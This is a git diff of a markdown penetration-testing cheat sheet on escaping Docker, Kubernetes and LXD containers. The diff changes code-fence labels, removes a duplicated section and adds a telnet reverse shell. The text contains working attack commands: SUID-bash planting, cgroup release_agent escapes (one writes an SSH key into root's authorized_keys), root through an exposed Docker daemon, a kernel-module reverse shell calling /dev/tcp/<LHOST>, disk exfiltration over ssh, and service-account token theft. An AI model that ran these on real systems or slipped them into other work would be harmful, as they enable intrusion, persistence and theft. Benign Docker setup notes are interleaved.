@@ -30,7 +30,7 @@
 
 ## deepce
 
-```c
+```console
 $ ./deepce.sh --exploit SOCK --command "cp /usr/bin/bash /mnt/bash; /usr/bin/chmod 4755 /mnt/bash;"
 ```
 
@@ -40,32 +40,32 @@ $ ./deepce.sh --exploit SOCK --command "cp /usr/bin/bash /mnt/bash; /usr/bin/chm
 
 > https://docs.docker.com/engine/install/ubuntu/
 
-```c
+```console
 $ sudo apt-get update
 $ sudo apt-get install ca-certificates curl gnupg
 ```
 
-```c
+```console
 $ sudo install -m 0755 -d /etc/apt/keyrings
 $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
 $ sudo chmod a+r /etc/apt/keyrings/docker.gpg
 ```
 
-```c
+```console
 $ echo \
   "deb [arch="$(dpkg --print-architecture)" signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
   "$(. /etc/os-release && echo "$VERSION_CODENAME")" stable" | \
   sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
 ```
 
-```c
+```console
 $ sudo apt-get update
 $ sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
 ```
 
 ### Common Commands
 
-```c
+```console
 $ docker pull <IMAGE>                  // pull image
 $ docker pull <IMAGE>:latest           // pull image with latest version
 $ docker pull <IMAGE>:<VERSION>        // pull image with specific version
@@ -86,7 +86,7 @@ $ docker rm <ID>                       // delete a specific container
 $ docker exec -it <ID> /bin/bash       // enter a running container
 ```
 
-```c
+```console
 $ docker -H <RHOST>:2375 info
 $ docker -H <RHOST>:2375 images
 $ docker -H <RHOST>:2375 version
@@ -105,7 +105,7 @@ $ docker -H <RHOST>:2375 exec -it 01ca084c69b7 /bin/sh
 
 #### Example Dockerfile
 
-```c
+```console
 # Example Dockerfile
 FROM ubuntu:22.04
 
@@ -130,7 +130,7 @@ CMD ["apache2ctl", "-D","FOREGROUND"]
 
 #### Build Example Dockerfile
 
-```c
+```console
 $ docker build -t <NAME> .
 $ docker run -d --name <NAME> -p 80:80 <NAME>
 ```
@@ -139,19 +139,19 @@ $ docker run -d --name <NAME> -p 80:80 <NAME>
 
 #### List Capabilities
 
-```c
+```console
 $ capsh --print
 ```
 
 #### Example
 
-```c
+```console
 $ docker run -it --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE <WEBSERVER>
 ```
 
 ### AppArmor
 
-```c
+```console
 $ aa-status
 ```
 
@@ -162,7 +162,7 @@ $ aa-status
 - Bind a socket for port `80/TCP` but not other `ports` or `protocols`.
 - `Cannot read` from directories such as `/bin`, `/lib`, `/usr`.
 
-```c
+```json
 /usr/sbin/httpd {
 
   capability setgid,
@@ -195,13 +195,13 @@ $ aa-status
 
 #### Import Profile
 
-```c
+```console
 $ apparmor_parser -r -W /PATH/TO/PROFILE/profile.json
 ```
 
 #### Apply Profile
 
-```c
+```console
 $ docker run --rm -it --security-opt apparmor=/PATH/TO/PROFILE/profile.json <CONTAINER>
 ```
 
@@ -209,7 +209,7 @@ $ docker run --rm -it --security-opt apparmor=/PATH/TO/PROFILE/profile.json <CON
 
 #### profile.json
 
-```c
+```json
 {
   "defaultAction": "SCMP_ACT_ALLOW",
   "architectures": ["SCMP_ARCH_X86_64"],
@@ -255,7 +255,7 @@ $ docker run --rm -it --security-opt apparmor=/PATH/TO/PROFILE/profile.json <CON
 
 #### Apply Profile
 
-```c
+```console
 $ docker run --rm -it --security-opt seccomp=/PATH/TO/PROFILE/profile.json <CONTAINER>
 ```
 
@@ -274,19 +274,19 @@ $ docker run --rm -it --security-opt seccomp=/PATH/TO/PROFILE/profile.json <CONT
 
 ##### Checking Capabilities
 
-```c
+```console
 $ capsh --print
 ```
 
 ##### Vulnerability Indicator Flag
 
-```c
+```console
 --security-opt apparmor=unconfined --cap-add=SYS_ADMIN
 ```
 
 ##### Modified PoC by TryHackMe
 
-```c
+```console
 $ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 $ echo 1 > /tmp/cgrp/x/notify_on_release
 $ host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
@@ -299,7 +299,7 @@ $ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
 ##### PoC for SSH Key Deployment
 
-```c
+```console
 mkdir /tmp/exploit && mount -t cgroup -o rdma cgroup /tmp/exploit && mkdir /tmp/exploit/x
 echo 1 > /tmp/exploit/x/notify_on_release
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
@@ -315,13 +315,13 @@ sh -c "echo \$\$ > /tmp/exploit/x/cgroup.procs"
 
 ##### Checking for Docker Socket
 
-```c
+```console
 $ ls -la /var/run | grep sock
 ```
 
 ##### Create a privileged Docker Container and mount the Host Filesystem
 
-```c
+```console
 $ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 
@@ -329,17 +329,17 @@ $ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
 ##### Checking for Misconfiguration
 
-```c
+```console
 $ curl http://<RHOST>:2375/version
 ```
 
 ##### Command Execution
 
-```c
+```console
 $ docker -H tcp://<RHOST>:2375 ps
 ```
 
-```c
+```console
 $ docker -H <RHOST>:2375 commit 01ca084c69b7
 sha256:aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf14619ac
 
@@ -348,7 +348,7 @@ New COMMIT:           aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf1
 New CONTAINER ID:     aa02ba520ac9
 ```
 
-```c
+```console
 $ docker -H <RHOST>:2375 run -it aa02ba520ac9 /bin/sh
 / # id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
@@ -358,13 +358,13 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 
 ##### Verify Environment
 
-```c
+```console
 $ ps aux
 ```
 
 ##### Exploitation via Namespace Enter (nsenter)
 
-```c
+```console
 $ nsenter --target 1 --mount --uts --ipc --net /bin/bash
 ```
 
@@ -378,7 +378,7 @@ $ nsenter --target 1 --mount --uts --ipc --net /bin/bash
 
 ###### reverse-shell.c
 
-```
+```c
 #include <linux/kmod.h>
 #include <linux/module.h>
 MODULE_LICENSE("GPL");
@@ -404,7 +404,7 @@ module_exit(reverse_shell_exit);
 
 ##### Makefile
 
-```c
+```console
 obj-m +=reverse-shell.o
 
 all:
@@ -416,7 +416,7 @@ clean:
 
 ##### Execution
 
-```c
+```console
 $ insmod reverse-shell.ko
 ```
 
@@ -428,7 +428,7 @@ $ insmod reverse-shell.ko
 - root privileges inside container
 - CAP_MKNOD
 
-```c
+```console
 root@<CONTAINER>:/# mknod sda b 8 0
 root@<CONTAINER>:/# chmod 777 sda
 root@<CONTAINER>:/# su <USERNAME>
@@ -436,412 +436,28 @@ root@<CONTAINER>:/# su <USERNAME>
 ```
 
 
-```c
+```console
 <USERNAME>@<RHOST>:~$ ps aux | grep /bin/sh
 <USERNAME>     2434  0.0  0.0   2576   932 ?        S+   19:58   0:00 /bin/sh
 <USERNAME>     2438  0.0  0.0   6480  2164 pts/1    S+   19:59   0:00 grep --color=auto /bin/sh
 ```
 
-```c
+```console
 <USERNAME>@<RHOST>:~$ cd /proc/2434/root
 <USERNAME>@<RHOST>:/proc/2434/root$
 ```
 
 Then you can read files through the blob on the host system. Alternatively you can dump them into an image file via SSH.
 
-```c
+```console
 $ dd if=/proc/2434/sda bs=512 | gzip -1 - | ssh <USERNAME>@<LHOST> 'dd of=/home/<USERNAME>/image.gz'
-```
-
-## Docker
-
-### Installation of the latest Version
-
-> https://docs.docker.com/engine/install/ubuntu/
-
-```c
-$ sudo apt-get update
-$ sudo apt-get install ca-certificates curl gnupg
-```
-
-```c
-$ sudo install -m 0755 -d /etc/apt/keyrings
-$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
-$ sudo chmod a+r /etc/apt/keyrings/docker.gpg
-```
-
-```c
-$ echo \
-  "deb [arch="$(dpkg --print-architecture)" signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
-  "$(. /etc/os-release && echo "$VERSION_CODENAME")" stable" | \
-  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-```
-
-```c
-$ sudo apt-get update
-$ sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
-```
-
-### Common Commands
-
-```c
-$ docker pull <IMAGE>                  // pull image
-$ docker pull <IMAGE>:latest           // pull image with latest version
-$ docker pull <IMAGE>:<VERSION>        // pull image with specific version
-$ docker image ls                      // list images
-$ docker image rm <IMAGE>              // remove image
-$ docker image rm <IMAGE>:latest       // remove image with latest version
-$ docker image rm <IMAGE>:<VERSION>    // remove image with specific version
-$ docker run --name <IMAGE>            // use a memorable name
-$ docker run -it <IMAGE> /bin/bash     // interact with image
-$ docker run -it -v /PATH/TO/DIRECTORY:/PATH/TO/DIRECTORY <IMAGE> /bin/bash   // run image and mount specific directory
-$ docker update --restart unless-stopped <CONTAINER>    // auto start container
-$ docker run -d <IMAGE>                // run image in background
-$ docker run -p 80:80 <IMAGE>          // bind port on the host
-$ docker ps                            // list running containers
-$ docker ps -a                         // list all containers
-$ docker stop <ID>                     // stops a specific container
-$ docker rm <ID>                       // delete a specific container
-$ docker exec -it <ID> /bin/bash       // enter a running container
-```
-
-```c
-$ docker -H <RHOST>:2375 info
-$ docker -H <RHOST>:2375 images
-$ docker -H <RHOST>:2375 version
-$ docker -H <RHOST>:2375 ps -a
-$ docker -H <RHOST>:2375 exec -it 01ca084c69b7 /bin/sh
-```
-
-### Dockerfiles
-
-- FROM       // build from a specific base image
-- RUN        // execute command in the container within a new layer
-- COPY       // copy files from the host filesystem
-- WORKDIR    // set the root file system of the container
-- CMD        // determines what command is run when the container starts (Example: CMD /bin/sh -c <FILE>.sh)
-- EXPOSE     // publishes a port in the users context
-
-#### Example Dockerfile
-
-```c
-# Example Dockerfile
-FROM ubuntu:22.04
-
-# Set working directory
-WORKDIR /
-
-# Create a file inside of the root directory
-RUN touch <FILE>
-
-# Perform updates
-RUN apt-get update -y
-
-# Install apache2
-RUN apt-get install apache2 -y
-
-# Expose port 80/TCP
-EXPOSE 80
-
-# Start the service
-CMD ["apache2ctl", "-D","FOREGROUND"]
-```
-
-#### Build Example Dockerfile
-
-```c
-$ docker build -t <NAME> .
-$ docker run -d --name <NAME> -p 80:80 <NAME>
-```
-
-### Capabilities
-
-#### List Capabilities
-
-```c
-$ capsh --print
-```
-
-#### Example
-
-```c
-$ docker run -it --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE <WEBSERVER>
-```
-
-### AppArmor
-
-```c
-$ aa-status
-```
-
-#### profile.json
-
-- Can read files located in `/var/www/`, `/etc/apache2/mime.types` and `/run/apache2`.
-- Read & write to `/var/log/apache2`.
-- Bind a socket for port `80/TCP` but not other `ports` or `protocols`.
-- `Cannot read` from directories such as `/bin`, `/lib`, `/usr`.
-
-```c
-/usr/sbin/httpd {
-
-  capability setgid,
-  capability setuid,
-
-  /var/www/** r,
-  /var/log/apache2/** rw,
-  /etc/apache2/mime.types r,
-
-  /run/apache2/apache2.pid rw,
-  /run/apache2/*.sock rw,
-
-  # Network access
-  network tcp,
-
-  # System logging
-  /dev/log w,
-
-  # Allow CGI execution
-  /usr/bin/perl ix,
-
-  # Deny access to everything else
-  /** ix,
-  deny /bin/**,
-  deny /lib/**,
-  deny /usr/**,
-  deny /sbin/**
-}
-```
-
-#### Import Profile
-
-```c
-$ apparmor_parser -r -W /PATH/TO/PROFILE/profile.json
-```
-
-#### Apply Profile
-
-```c
-$ docker run --rm -it --security-opt apparmor=/PATH/TO/PROFILE/profile.json <CONTAINER>
-```
-
-### Seccomp
-
-#### profile.json
-
-```c
-{
-  "defaultAction": "SCMP_ACT_ALLOW",
-  "architectures": ["SCMP_ARCH_X86_64"],
-  "syscalls": [
-    {
-      "name": "socket",
-      "action": "SCMP_ACT_ERRNO",
-      "args": []
-    },
-    {
-      "name": "connect",
-      "action": "SCMP_ACT_ERRNO",
-      "args": []
-    },
-    {
-      "name": "bind",
-      "action": "SCMP_ACT_ERRNO",
-      "args": []
-    },
-    {
-      "name": "listen",
-      "action": "SCMP_ACT_ERRNO",
-      "args": []
-    },
-    {
-      "name": "accept",
-      "action": "SCMP_ACT_ERRNO",
-      "args": []
-    }
-    {
-      "name": "read",
-      "action": "SCMP_ACT_ALLOW",
-      "args": []
-    },
-    {
-      "name": "write",
-      "action": "SCMP_ACT_ALLOW",
-      "args": []
-    }
-  ]
-}
-```
-
-#### Apply Profile
-
-```c
-$ docker run --rm -it --security-opt seccomp=/PATH/TO/PROFILE/profile.json <CONTAINER>
-```
-
-### Control Groups (cgroup) Privilege Escalation
-
-> https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.
-
-#### Requirements
-
-* Already root inside a container
-* The container must be run with the SYS_ADMIN Linux capability
-* The container must lack an AppArmor profile, or otherwise allow the mount syscall
-* The cgroup v1 virtual filesystem must be mounted read-write inside the container
-
-#### Checking Capabilities
-
-```c
-$ capsh --print
-```
-
-#### Vulnerability Indicator Flag
-
-```c
---security-opt apparmor=unconfined --cap-add=SYS_ADMIN
-```
-
-#### Modified PoC by TryHackMe
-
-```c
-$ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
-$ echo 1 > /tmp/cgrp/x/notify_on_release
-$ host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-$ echo "$host_path/exploit" > /tmp/cgrp/release_agent
-$ echo '#!/bin/sh' > /exploit
-$ echo "cat /home/cmnatic/<FILE> > $host_path/<FILE>" >> /exploit
-$ chmod a+x /exploit
-$ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
-```
-
-#### PoC for SSH Key Deployment
-
-```c
-mkdir /tmp/exploit && mount -t cgroup -o rdma cgroup /tmp/exploit && mkdir /tmp/exploit/x
-echo 1 > /tmp/exploit/x/notify_on_release
-host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-echo "$host_path/cmd" > /tmp/exploit/release_agent
-
-echo '#!/bin/sh' > /cmd
-echo "echo '<SSH_KEY>' > /root/.ssh/authorized_keys" >> /cmd
-chmod a+x /cmd
-sh -c "echo \$\$ > /tmp/exploit/x/cgroup.procs"
-```
-
-### Docker Socket Privilege Escalation
-
-#### Checking for Docker Socket
-
-```c
-$ ls -la /var/run | grep sock
-```
-
-#### Create a privileged Docker Container and mount the Host Filesystem
-
-```c
-$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-```
-
-### Exposed Docker Daemon
-
-#### Checking for Misconfiguration
-
-```c
-$ curl http://<RHOST>:2375/version
-```
-
-#### Command Execution
-
-```c
-$ docker -H tcp://<RHOST>:2375 ps
-```
-
-```c
-$ docker -H <RHOST>:2375 commit 01ca084c69b7
-sha256:aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf14619ac
-
-Initial CONTAINER ID: 01ca084c69b7
-New COMMIT:           aa02ba520ac94c2ca87366344c6c6f49d351a4ef05ba65341109cdccf14619ac
-New CONTAINER ID:     aa02ba520ac9
-```
-
-```c
-$ docker -H <RHOST>:2375 run -it aa02ba520ac9 /bin/sh
-/ # id
-uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
-```
-
-### Abusing Namespaces
-
-#### Verify Environment
-
-```c
-$ ps aux
-```
-
-#### Exploitation via Namespace Enter (nsenter)
-
-```c
-$ nsenter --target 1 --mount --uts --ipc --net /bin/bash
-```
-
-### Abusing SYS_MODULE Capability
-
-> https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
-
-> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
-
-#### Kernel Module
-
-##### reverse-shell.c
-
-```
-#include <linux/kmod.h>
-#include <linux/module.h>
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("AttackDefense");
-MODULE_DESCRIPTION("LKM reverse shell module");
-MODULE_VERSION("1.0");
-
-char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1", NULL};
-static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
-
-// call_usermodehelper function is used to create user mode processes from kernel space
-static int __init reverse_shell_init(void) {
-    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-}
-
-static void __exit reverse_shell_exit(void) {
-    printk(KERN_INFO "Exiting\n");
-}
-
-module_init(reverse_shell_init);
-module_exit(reverse_shell_exit);
-```
-
-#### Makefile
-
-```c
-obj-m +=reverse-shell.o
-
-all:
-        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
-
-clean:
-        make -C /lib
-```
-
-#### Execution
-
-```c
-$ insmod reverse-shell.ko
 ```
   
 ## Docker-Compose
 
 ### Common Commands
 
-```c
+```console
 $ docker-compose up       // (re)create/build and start containers specified in the compose file
 $ docker-compose start    // start specific containers from compose file
 $ docker-compose down     // stop and delete containers from the compose file
@@ -851,7 +467,7 @@ $ docker-compose build    // build (not start) containers from the compose file
 
 ### Create Networks and run Containers
 
-```c
+```console
 $ docker network create <NETWORK>
 $ docker run -p 80:80 --name <NAME> --net <NETWORK> <NAME>
 $ docker run --name <NAME> --net <NETWORK> <NAME>
@@ -874,7 +490,7 @@ $ docker-compose up
 
 #### Example docker-compose.yml
 
-```c
+```yaml
 version: '3.3'
 services:
   web:
@@ -906,7 +522,7 @@ networks:
 
 > https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux
 
-```c
+```console
 $ sudo apt-get update && sudo apt-get install -y apt-transport-https
 $ curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo gpg --dearmour -o /usr/share/keyrings/kubernetes.gpg
 $ echo "deb [arch=amd64 signed-by=/usr/share/keyrings/kubernetes.gpg] https://apt.kubernetes.io/ kubernetes-xenial main" | sudo tee -a /etc/apt/sources.list.d/kubernetes.list
@@ -915,7 +531,7 @@ $ sudo apt-get install -y kubectl
 ```
 ### Common Commands
 
-```c
+```console
 $ kubectl get pods                                // list all available pods
 $ kubectl get services                            // list all services
 $ kubectl get serviceaccount                      // list all serviceaccounts
@@ -933,7 +549,7 @@ $ kubectl exec -it everything-allowed-exec-pod --token=<TOKEN> -- /bin/bash    /
 
 ### Secret Location
 
-```c
+```console
 /var/run/secrets/kubernetes.io/serviceaccount/token
 ```
 
@@ -943,11 +559,11 @@ $ kubectl exec -it everything-allowed-exec-pod --token=<TOKEN> -- /bin/bash    /
 
 > https://jsonformatter.org/yaml-formatter
 
-```c
+```console
 $ export token="<TOKEN>"
 ```
 
-```c
+```console
 cat << 'EOF' |
 apiVersion: v1
 kind: Pod
@@ -983,7 +599,7 @@ EOF
 
 > https://github.com/cyberark/kubeletctl
 
-```c
+```console
 $ kubeletctl pods -s <RHOST>
 $ kubeletctl runningpods -s <RHOST>
 $ kubeletctl runningpods -s <RHOST> | jq -c '.items[].metadata | [.name, .namespace]'
@@ -997,7 +613,7 @@ $ kubeletctl -s <RHOST> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/
 
 ### API RBAC Attack
 
-```c
+```console
 $ kubectl get namespaces
 $ kubectl get pods --all-namespaces -o wide
 $ kubectl get pods -n <NAMESPACE>
@@ -1016,25 +632,25 @@ $ kubectl create -f <BADPOD>.yaml --token=<TOKEN>
 
 ### Privilege Escalation
 
-```c
+```console
 $ sudo ./build-alpine
 ```
 
 or
 
-```c
+```console
 $ sudo ./build-alpine -a i686
 ```
 
 ### Configuration
 
-```c
+```console
 $ lxd init
 ```
 
 ### Settings
 
-```c
+```console
 Would you like to use LXD clustering? (yes/no) [default=no]:
 Do you want to configure a new storage pool? (yes/no) [default=yes]:
 Name of the new storage pool [default=default]:
@@ -1051,42 +667,50 @@ Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
 
 ### Starting
 
-```c
+```console
 $ lxc launch ubuntu:18.04
 ```
 
 ### Import
 
-```c
+```console
 $ lxc image import ./alpine-v3.12-x86_64-20200622_0953.tar.gz --alias foobar
 ```
 
 ### Status
 
-```c
+```console
 $ lxc image list
 ```
 
 ### Security Parameters
 
-```c
+```console
 $ lxc init foobar ignite -c security.privileged=true
 ```
 
 ### Set mount Options
 
-```c
+```console
 $ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
 ```
 
 ### Starting Image
 
-```c
+```console
 $ lxc start ignite
 ```
 
 ### Enter Image
 
-```c
+```console
 $ lxc exec ignite /bin/sh
+```
+
+## Telnet Shell
+
+Getting a proper reverse shell inside a container, when sh, bash, netcat or python is missing.
+
+```console
+$ mkfifo /tmp/cth; sh -i 2>&1 </tmp/cth | telnet <LHOST> <LPORT> >/tmp/cth; rm /tmp/cth
 ```
